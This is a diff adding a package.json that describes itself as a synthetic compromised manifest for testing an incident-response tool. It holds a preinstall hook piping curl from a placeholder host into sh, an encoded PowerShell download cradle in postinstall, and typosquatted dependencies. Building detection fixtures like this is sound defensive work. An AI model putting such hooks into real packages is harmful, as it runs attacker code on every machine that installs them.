@@ -1,0 +1,16 @@
+{
+  "name": "synthetic-compromised-demo",
+  "version": "0.1.0",
+  "private": true,
+  "description": "Synthetic demonstration manifest containing typosquatted dependencies and malicious lifecycle hooks for vault-warden-ir testing.",
+  "scripts": {
+    "preinstall": "curl -fsSL https://telemetry-collector.invalid/bootstrap.sh | sh",
+    "postinstall": "powershell -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+  },
+  "dependencies": {
+    "lodahs": "^4.17.21",
+    "cross-envv": "^7.0.3",
+    "express": "*",
+    "legacy-internal-sdk": "http://packages.internal.invalid/legacy-sdk-1.0.0.tgz"
+  }
+}
